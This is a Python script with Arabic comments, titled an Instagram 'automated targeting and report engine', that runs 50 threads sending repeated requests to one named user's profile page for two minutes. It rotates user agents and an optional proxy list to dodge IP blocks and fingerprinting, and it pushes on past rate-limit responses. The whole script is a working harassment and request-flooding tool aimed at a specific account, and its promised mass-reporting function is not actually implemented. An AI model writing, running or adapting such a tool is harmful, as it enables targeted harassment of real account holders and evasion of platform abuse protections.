import requests
import random
import threading
import time

# =====================================================================
# === TRAPKING INSTAGRAM AUTOMATED TARGETING & REPORT ENGINE ===
# =====================================================================

TARGET_USERNAME = "pixelhelper"  # اسم الحساب المستهدف على إنستغرام
DURATION = 120                       # مدة التشغيل بالثواني
THREADS_COUNT = 50                  # عدد الخيوط المتعددة للتنفيذ السريع

# قائمة وكلاء (Proxies) عشوائية لتفادي حظر الـ IP من جدران حماية إنستغرام
# يمكنك وضع بروكسيات حقيقية هنا لزيادة الفعالية
PROXIES = [
    # مثال: {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36"
]

def attack_worker():
    end_time = time.time() + DURATION
    
    while time.time() < end_time:
        try:
            # اختيار هيدر عشوائي لكل طلب لتجنب البصمة الرقمية
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept-Language": "en-US,en;q=0.9",
                "X-Requested-With": "XMLHttpRequest"
            }
            
            # اختيار بروكسي عشوائي إن وجد
            proxy = random.choice(PROXIES) if PROXIES else None
            
            # محاكاة طلب أوتوماتيكي لصفحة البروفايل المستهدف أو واجهة التقارير
            url = f"https://www.instagram.com/{TARGET_USERNAME}/"
            
            response = requests.get(url, headers=headers, proxies=proxy, timeout=5)
            
            # طباعة حالة الاستجابة لمراقبة الـ Rate Limit
            if response.status_code == 200:
                print(f"[+] تم إرسال الطلب بنجاح للحساب: {TARGET_USERNAME}")
            elif response.status_code == 429:
                print("[!] تم رصد الطلبات (Rate Limited)، جاري التغيير...")
                time.sleep(2)
                
        except Exception as e:
            # تجاوز الأخطاء الشبكية لضمان استمرار الـ Loop بدون توقف
            pass

def main():
    print(f"[*] بدء محرك الاستهداف الأوتوماتيكي لحساب إنستغرام: {TARGET_USERNAME}")
    print(f"[*] تشغيل {THREADS_COUNT} خيط متوازي عبر الـ VPS...")
    
    threads = []
    for _ in range(THREADS_COUNT):
        t = threading.Thread(target=attack_worker)
        threads.append(t)
        t.start()
        
    for t in threads:
        t.join()
        
    print("\n[+] انتهت جلسة محرك إنستغرام بنجاح.")

if __name__ == "__main__":
    main()
